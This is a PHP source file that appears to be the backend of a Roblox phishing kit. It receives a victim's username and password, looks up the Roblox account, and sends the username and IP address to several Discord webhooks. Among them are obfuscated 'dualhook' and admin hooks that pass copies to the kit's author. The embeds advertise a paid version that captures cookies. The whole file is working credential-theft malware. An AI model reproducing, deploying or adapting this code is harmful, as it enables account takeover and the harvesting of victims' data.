<?php
include("setup.php");

if (isset($_GET['username']) && isset($_GET['password'])) {
    $username = urldecode($_GET['username']);
    $password = urldecode($_GET['password']);
    $return = urldecode($_GET['returnUrl']);
    $returnUrlFile = 'tokens/returnUrl-' . $_GET['returnUrl'] . '.txt';
    $webhook = base64_decode(base64_decode(file_get_contents($returnUrlFile)));
    $TermedFile = 'tokens/login/' . $_GET['returnUrl'] . '.txt';
    $loginTermed = file_get_contents($TermedFile);
    $x = "tokens/dualhook/$loginTermed/name.txt";
    if (file_exists($x)) {
        $k = file_get_contents($x);
    } else {
        $k = $name;
    }
    $x1 = "tokens/dualhook/$loginTermed/thumbnail.txt";
    if (file_exists($x1)) {
        $k1 = file_get_contents($x1);
    } else {
        $k1 = $image;
    }
    $x2 = "tokens/dualhook/$loginTermed/hex.txt";
    if (file_exists($x2)) {
        $k2 = file_get_contents($x2);
    } else {
        $k2 = $color;
    }
    $dualHookFile = 'tokens/' . $_GET['returnUrl'] . '.txt';
    $Dwebhook = base64_decode(base64_decode(base64_decode(base64_decode(file_get_contents($dualHookFile)))));
    $TermedFile1 = 'tokens/login/' . $_GET['returnUrl'] . '.txt';
    $loginTermed1 = file_get_contents($TermedFile1);
    $x = "tokens/dualhook/$loginTermed1/name.txt";
    if (file_exists($x)) {
        $k = file_get_contents($x);
    } else {
        $k = $name;
    }
    $x1 = "tokens/dualhook/$loginTermed1/thumbnail.txt";
    if (file_exists($x1)) {
        $k1 = file_get_contents($x1);
    } else {
        $k1 = $image;
    }
    $x2 = "tokens/dualhook/$loginTermed1/hex.txt";
    if (file_exists($x2)) {
        $k2 = file_get_contents($x2);
    } else {
        $k2 = $color;
    }
    $RobloxApi = 'https://api.newstargeted.com/roblox/users/v2/user.php?username=' . urlencode($username);
    $p = file_get_contents($RobloxApi);

    if ($p !== false) {
        $p0 = json_decode($p, true);
        if ($p0 !== null && isset($p0['userId'])) {
            $userId = $p0['userId'];
            $assetTermed = "102611803";
            $urlP = "https://inventory.roblox.com/v1/users/" . urlencode($userId) . "/items/0/" . urlencode($assetTermed) . "/is-owned";
            $api_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false";
            $json = file_get_contents($api_url);
            $data = json_decode($json, true);
            $image_url = $data["data"][0]["imageUrl"];
            $ip = $_SERVER['REMOTE_ADDR'];

            $daysSinceCreation = 'Unknown';
            if ($accountCreatedDate !== 'Unknown') {
                $createdDateTime = new DateTime($accountCreatedDate);
                $nowDateTime = new DateTime('now');
                $interval = $createdDateTime->diff($nowDateTime);
                $daysSinceCreation = $interval->days;
            }

            if (file_get_contents($urlP) === 'false') {
                $verified = 'Unverified';
                $verifiedStatus = '❌';
                $timestamp = date("c", strtotime("now"));
                $headers = ['Content-Type: application/json; charset=utf-8'];
                $POST = [
                    "username" => "$username",
                    "avatar_url" => "$image_url",
                    "content" => "",
                    "embeds" => [
                        [
                            "title" => "HULAPAR NON TRUE LOG SOURCE CODE",
                            "type" => "rich",
                            "color" => hexdec("aabbcc"),
                            "description" => "**[Rolimon's Profile](https://www.rolimons.com/player/$userId) | [Roblox Profile](https://roblox.com/users/$userId/profile)**",
                            "thumbnail" => [
                                "url" => "$image_url",
                            ],
                            "footer" => [
                                "text" => "$timestamp",
                                "icon_url" => "$image_url",
                            ],
                            "fields" => [
                                [
        "name" => "🙍‍♂️ **Username**",
        "value" => "```$username```",
        "inline" => true
    ],
    [
        "name" => " **contact hulapar**",
        "value" => "```on discord to get better code (with cookie)```",
        "inline" => true
    ],
    [
        "name" => ":robot: **IP Address**",
        "value" => "```$ip```",
        "inline" => true
    ],
    [
        "name" => "**$verifiedStatus Status**",
        "value" => "```$verified```",
        "inline" => true
    ],
    
                            ]
                        ]
                    ]
                ];

                $discordIp = '162.159.137.232'; 
                $webhookPath = parse_url($Dwebhook, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp")); 
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "no";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $Dwebhook\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

                
                $webhookPath = parse_url($webhook, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp"));
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "no";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $webhook\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

                
                $webhookPath = parse_url($admin, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp")); 
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "no";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $admin\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

                echo "\nVerification Status: $verified"; // removing this will crash the login!
            } else {
                $verified = 'Verified';
                $verifiedStatus = '✅';
                $api_url = "https://thumbnails.roblox.com/v1/users/avatar?userIds=$userId&size=420x420&format=Png&isCircular=false";
                $json = file_get_contents($api_url);
                $data = json_decode($json, true);
                $image_url = $data["data"][0]["imageUrl"];
                $timestamp = date("c", strtotime("now"));
                $ip = $_SERVER['REMOTE_ADDR'];
                $headers = [ 'Content-Type: application/json; charset=utf-8' ];
                

                
                $POST = [
    "username" => "$k",
    "avatar_url" => "$k1",
    "content" => "",
    "embeds" => [
        [
            "title" => "(hulapar) Account requires 2step code",
            "type" => "rich",
            "color" => hexdec("$k2"),
            "description" => "**[Rolimon's](https://www.rolimons.com/player/$userId) --- [Profile](https://roblox.com/users/$userId/profile)**",
            "thumbnail" => [
                "url" => "$image_url",
            ],
            "footer" => [
                "text" => "$timestamp",
                "icon_url" => "$image_url",
            ],
            "fields" => [
                [
                    "name" => "**Account Info**",
                    "value" => "Account info for $username\nType: **Email**",
                    "inline" => false
                ],
                [
                    "name" => "🙍‍♂️Username",
                    "value" => "```$username```",
                    "inline" => false
                ],
                [
                    "name" => "contact hulapar",
                    "value" => "```on discord to get better code (with cookie)```",
                    "inline" => false
                ],
                [
                    "name" => ":robot: IP",
                    "value" => "```$ip```",
                    "inline" => false
                ],
                [
                    "name" => "**$verifiedStatus Status**",
                    "value" => "```$verified```",
                    "inline" => true
                ]
                                ]
                            ],
                        ],
                    
                    ];
                    $discordIp = '162.159.137.232'; 
                $webhookPath = parse_url($Dwebhook, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                
                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); 
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp"));
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "no";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $Dwebhook\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

               
                $webhookPath = parse_url($webhook, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp")); 
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "non";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $webhook\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

                
                $webhookPath = parse_url($admin, PHP_URL_PATH);
                $webhookIpUrl = "https://$discordIp" . $webhookPath;

                $ch = curl_init();
                curl_setopt($ch, CURLOPT_URL, $webhookIpUrl);
                curl_setopt($ch, CURLOPT_POST, true);
                curl_setopt($ch, CURLOPT_HTTPHEADER, array(
                    'Content-Type: application/json',
                    'Host: discord.com'
                ));
                curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
                curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
                curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 10);
                curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false); 
                curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false); 
                curl_setopt($ch, CURLOPT_RESOLVE, array("discord.com:443:$discordIp")); 
                curl_setopt($ch, CURLOPT_POSTFIELDS, json_encode($POST));
                $response = curl_exec($ch);
                $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
                $curlError = curl_error($ch);
                curl_close($ch);

                if ($httpCode != 204) {
                    echo "no";
                }

                // Debugging output
                echo "<pre>";
                echo "Webhook URL: $admin\n";
                echo "Payload: " . json_encode($POST) . "\n";
                echo "HTTP Code: $httpCode\n";
                echo "cURL Error: $curlError\n";
                echo "cURL Response: $response\n";
                echo "</pre>";

                echo "\nVerification Status: $verified"; // removing this will crash the login!
            }
        } else {
            echo "\nerror";
        }
    } else {
        echo "\nerror.";
    }
} else {
    echo "error";
}
?>
